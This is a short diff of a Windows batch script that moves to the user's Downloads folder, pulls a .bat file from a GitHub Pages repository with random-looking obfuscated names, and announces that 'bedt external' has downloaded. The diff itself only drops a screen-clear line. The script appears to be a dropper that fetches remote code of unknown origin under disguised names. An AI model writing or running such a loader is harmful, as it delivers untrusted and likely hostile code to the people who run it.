@@ -1,5 +1,4 @@
 @echo off
-cls
 cd %userprofile%\Downloads
 curl -O https://raw.githubusercontent.com/aaronestaaron/pbvFmVVhTdTYdqhpSXRYADJWBDPFLjAOOYCsHveMAiarV.github.io/refs/heads/main/yMPoGoPIqKtssKSZAvJywLfRXhmgHBzPiDEkliwyYmdjY.bat
 echo bedt external has downloaded.
